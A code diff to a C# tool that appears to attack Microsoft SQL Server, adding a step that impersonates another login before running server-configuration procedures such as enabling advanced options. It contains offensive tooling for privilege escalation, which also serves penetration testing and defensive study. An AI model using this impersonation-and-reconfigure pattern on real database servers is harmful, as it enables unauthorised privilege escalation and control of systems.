@@ -67,6 +67,14 @@ Optional arguments:
                 return;
             }
 
+            // I am confused about why it is necessary to perform this step as a separate procedure
+            // But it seems in-line impersonation doesn't work properly
+            if (!String.IsNullOrEmpty(argumentSet.impersonate))
+            {
+                Console.WriteLine("[*] Attempting impersonation as {0}", argumentSet.impersonate);
+                SQLExecutor.ExecuteProcedure(connection, "", argumentSet.impersonate);
+            }
+
             var procedures = new Dictionary<string, string>();
 
             procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
@@ -80,7 +88,11 @@ Optional arguments:
 
                 if (String.IsNullOrEmpty(argumentSet.target) && String.IsNullOrEmpty(argumentSet.intermediate))
                 {
-                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
+                    SQLExecutor.ExecuteProcedure(
+                       connection,
+                       procedures[step],
+                       argumentSet.impersonate
+                       );
                 }
                 else if (String.IsNullOrEmpty(argumentSet.intermediate))
                 {
